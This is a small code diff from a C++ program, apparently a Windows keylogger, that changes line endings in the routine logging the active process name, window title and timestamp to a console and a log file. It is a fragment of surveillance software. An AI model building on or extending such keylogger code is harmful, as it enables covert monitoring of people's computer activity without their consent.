@@ -97,11 +97,11 @@ void Keylogger::addWindowTimeStamps() {
 		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
 			std::wcout << "!!!!ploho!!!";
 		} else {
-			std::wcout << "\n### " << bufferProcessName <<
-				" --- " << bufferTitle << " ### " << timeStrBuffer << " ###\n";
+			std::wcout << "\r\n### " << bufferProcessName <<
+				" --- " << bufferTitle << " ### " << timeStrBuffer << " ###\r\n";
 		}
 
-		logFile << "\n### " << bufferProcessName << " --- " << bufferTitle << " ### " << timeStrBuffer << " ###\n";
+		logFile << "\r\n### " << bufferProcessName << " --- " << bufferTitle << " ### " << timeStrBuffer << " ###\r\n";
 	}
 }
 
